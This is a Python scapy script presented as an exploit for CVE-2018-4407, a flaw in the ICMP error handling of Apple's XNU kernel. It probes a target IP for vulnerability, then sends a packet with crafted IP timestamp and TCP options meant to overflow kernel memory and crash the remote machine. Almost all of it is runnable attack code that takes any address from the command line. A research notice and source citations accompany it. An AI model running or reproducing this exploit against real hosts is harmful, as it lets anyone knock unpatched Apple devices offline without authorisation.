#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# CVE   : CVE-2018-4407
# Author: Nixawk
# Notice: Just for security research

# IP Header Format
# 0                   1                   2                   3   
# 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |Version|  IHL  |Type of Service|          Total Length         |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |         Identification        |Flags|      Fragment Offset    |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |  Time to Live |    Protocol   |         Header Checksum       |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                       Source Address                          |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Destination Address                        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Options                    |    Padding    |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


# TCP Header Format
#  0                   1                   2                   3
#  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |          Source Port          |       Destination Port        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                        Sequence Number                        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Acknowledgment Number                      |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |  Data |           |U|A|P|R|S|F|                               |
# | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
# |       |           |G|K|H|T|N|N|                               |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |           Checksum            |         Urgent Pointer        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Options                    |    Padding    |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                             data                              |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

# How to exploit XNU kernel ?

    # bsd/netinet/in_proto.c - in_dinit()
    # bsd/netinet/in_proto.c - ip_proto_input()
    # bsd/netinet/ip_input.c - ip_input_process_list()
    # bsd/netinet/ip_input.c - ip_dooptions() - goto bad; - icmp_error
        # IPOPT_LSRR
        # IPOPT_SSRR
        # IPOPT_RR
        # IPOPT_TS
        # IPOPT_TS_TSONLY
        # IPOPT_TS_TSANDADDR
        # IPOPT_TS_PRESPEC
        # IPOPT_RA

    # bsd/netinet/ip_icmp.c
        # https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_icmp.c#L203
        # https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_icmp.h#L84

        # case ICMP_PARAMPROB:
        #     if (code > 1)
        #         goto badcode;
        #     code = PRC_PARAMPROB;
        #     goto deliver;

        # icp = mtod(m, struct icmp *);

        # icmplen = min(oiphlen + icmpelen, min(nlen, oip->ip_len));
        # if (icmplen < sizeof(struct ip))
        #     goto freeit;

        # icp->icmp_code = code;
        # m_copydata(n, 0, icmplen, (caddr_t)&icp->icmp_ip);
        # nip = &icp->icmp_ip;


import random
import string
from scapy.all import *


# Disable verbose mode
conf.verbose = 0


def generate_ip_hdr(ip_addr, tcp_layer):
    """generate a ip packet.
    https://tools.ietf.org/rfc/rfc791.txt
    https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml
    """

    # define IPOPT_EOL           0       /* end of option list */
    # define IPOPT_NOP           1       /* no operation */

    # define IPOPT_RR            7       /* record packet route */
    # define IPOPT_TS            68      /* timestamp */
    # define IPOPT_SECURITY      130     /* provide s,c,h,tcc */
    # define IPOPT_LSRR          131     /* loose source route */
    # define IPOPT_SATID         136     /* satnet id */
    # define IPOPT_SSRR          137     /* strict source route */
    # define IPOPT_RA            148     /* router alert */

    # tcp_layer.show()

    option_type = "\x44"                # Internet Timestamp
    option_data = tcp_layer.build()
    option_length = len(option_data)

    ip_hdr_options = "".join(
        [
            option_type,
            chr(option_length),
            # tcp_layer raw data
        ]
    )

    return IP(
        dst=ip_addr,
        options=[IPOption(ip_hdr_options)]
    )


def generate_tcp_hdr():
    """generate a tcp packet.
    https://tools.ietf.org/rfc/rfc793.txt
    https://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml
    """

    random_char = random.choice(string.printable)
    malicious_tcp_options = [
        [
            (19, random_char * 18),  # 18 # MD5 Signature Option
            (19, random_char * 18),  # 36 # MD5 Signature Option
        ],
        [
            (19, random_char * 18), # 18
            (6, random_char * 6),   # 24
            (6, random_char * 6),   # 30
            (4, random_char * 2),   # 32
        ],
        [
            (19, random_char * 18),  # 18 # MD5 Signature Option
            (8, random_char * 10),   # 28 # Timestamps
            (2, random_char * 4),    # 32 # Maximum Segment Size
        ],
        [
            (8, random_char * 10),   # 10 # Timestamps
            (8, random_char * 10),   # 20 # Timestamps
            (8, random_char * 10),   # 30 # Timestamps
            (4, random_char * 2),    # 32 # Maximum Segment Size
        ],
        [
            (27, random_char * 8),    # 8  # Quick-Start
            (27, random_char * 8),    # 16 # Quick-Start
            (27, random_char * 8),    # 24 # Quick-Start
            (27, random_char * 8),    # 32 # Quick-Start
        ]
    ]

    return TCP(
        dport=random.choice(range(0, 65535)),
        options=random.choice(malicious_tcp_options)
    )    


def check(ip):
    """test if target is vulnerable.
    """
    ip = IP(dst=ip, options=IPOption("A" * 8))
    pkt = ip / raw("A" * 65)
    # pkt.show()

    data = sr1(pkt, verbose=False, timeout=8)
    if not data:
        return False

    if not data.haslayer('ICMP'):
        return False

    icmp = data.getlayer('ICMP')

    # icmp.type # 12 - parameter-problem
    # icmp.code # 0  - ip-header-bad

    return icmp.type == 12 and icmp.code == 0


def exploit(ip_addr):
    """https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407
    """
    tcp_hdr = generate_tcp_hdr()
    ip_hdr = generate_ip_hdr(ip_addr, tcp_hdr)
    pkt = ip_hdr / tcp_hdr
    # pkt.show()

    send(pkt, verbose=False)


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("[*] Usage: %s <ip>\n" % sys.argv[0])
        sys.exit(1)

    ip_addr = sys.argv[1]

    if check(ip_addr):
        print("[+] %s may be vulnerable to CVE-2018-4407" % ip_addr)
        exploit(ip_addr)
    else:
        print("[*] %s may be not vulnerable to CVE-2018-4407" % ip_addr)


# references
# https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407
# https://twitter.com/ihackbanme/status/1057811965945376768
# https://github.com/apple/darwin-xnu
# https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_icmp.c#L339
# https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_input.c#L3495
# https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_input.c#L1835
# https://www.freebsd.org/cgi/man.cgi?query=mtod
# https://tools.ietf.org/rfc/rfc791.txt
# https://tools.ietf.org/rfc/rfc793.txt
# http://www.rhyshaden.com/ipdgram.htm
# https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml
# https://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml
# https://github.com/wireshark/wireshark/blob/1539e455d70c5f340ce80021c770b8f992051ec2/epan/dissectors/packet-ip.c#L385
# https://github.com/secdev/scapy/blob/9687222c3f0af6ef89ecfe15e5b983e1f7b5b31e/scapy/layers/inet.py#L553
# https://github.com/secdev/scapy/blob/9687222c3f0af6ef89ecfe15e5b983e1f7b5b31e/scapy/layers/inet.py#L250
# https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/tcp.h#L136
# https://nvd.nist.gov/vuln/detail/CVE-2018-4407
